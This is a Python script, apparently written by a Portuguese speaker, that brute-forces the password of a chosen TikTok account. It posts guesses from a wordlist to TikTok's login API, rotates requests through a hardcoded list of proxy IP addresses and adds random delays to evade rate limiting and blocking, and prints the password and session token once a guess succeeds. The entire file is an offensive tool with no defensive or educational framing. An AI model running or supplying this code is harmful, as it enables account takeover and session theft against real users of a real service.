import requests
import time
import random
from urllib.parse import urljoin

TARGET_URL = "https://www.tiktok.com/api/user/account/login/"
USERNAME = "seu_usuario_aqui"  # Substitua pelo nome de usuário existente
PROXY_LIST = [
    "http://103.152.112.162:80",
    "http://185.162.230.55:80",
    "http://47.243.177.210:8080",
    "http://103.216.82.20:6666",
    "http://178.128.242.85:8080",
    "http://103.152.112.162:8080",
    "http://198.50.163.192:8081",
    "http://103.216.82.15:6666",
    "http://45.77.55.173:8080",
    "http://103.152.112.145:80",
    "http://185.162.230.55:8080",
    "http://103.152.112.145:8080",
    "http://178.128.242.85:80",
    "http://103.216.82.20:8080",
    "http://103.216.82.15:8080",
    "http://47.243.177.210:80",
    "http://198.50.163.192:80",
    "http://45.77.55.173:80",
    "http://103.152.112.162:3128",
    "http://185.162.230.55:3128"
]


with open('wordlist.txt', 'r', encoding='utf-8') as f:
    passwords = [line.strip() for line in f if line.strip()]


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "X-Tt-Token": ""
}

def attempt_login(password):
    
    proxy = {'http': random.choice(PROXY_LIST), 'https': random.choice(PROXY_LIST)}
    
    payload = {
        "username": USERNAME,
        "password": password,
        "service": "tiktok",
        "device_platform": "web_pc"
    }

    try:
        response = requests.post(TARGET_URL, data=payload, headers=headers, proxies=proxy, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('code') == 0: 
                print(f"SUCESSO! Senha encontrada: {password}")
                print(f"Token: {data.get('data', {}).get('sessionid', 'N/A')}")
                return True
            else:
                print(f"Senha incorreta: {password} (Erro API: {data})")
        else:
            print(f"Timeout ou erro de conexão com a senha: {password} (Status: {response.status_code})")
            
    except Exception as e:
        print(f"Erro ao tentar senha {password}: {e}")

    return False

def main():
    print(f"Iniciando ataque de força bruta para usuário: {USERNAME}")
    print(f"Cantidade de senhas na wordlist: {len(passwords)}")
    
    for password in passwords:
        if attempt_login(password):
            break
        
        
        delay = random.uniform(2.0, 5.0)
        time.sleep(delay)

    print("Ataque concluído.")

if __name__ == "__main__":
    main()
